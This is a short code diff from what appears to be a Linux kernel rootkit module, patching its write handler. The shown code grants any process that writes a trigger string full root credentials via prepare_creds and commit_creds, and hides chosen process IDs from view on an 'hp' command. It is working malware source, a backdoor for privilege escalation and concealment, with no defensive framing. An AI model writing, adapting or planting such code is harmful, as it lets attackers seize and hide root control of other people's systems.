@@ -191,8 +191,8 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
 		struct cred *credentials = prepare_creds();
 		credentials->uid.val = 0;
 		credentials->gid.val = 0;
-		//credentials->uid = credentials->euid = 0;
-		//credentials->gid = credentials->egid = 0;
+		credentials->uid = credentials->euid;
+		credentials->gid = credentials->egid;
 		commit_creds(credentials);
 	} else if (!strncmp(buff, "hp", MIN(2, count))) {//hpXXXXXX hides process with given id
 		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
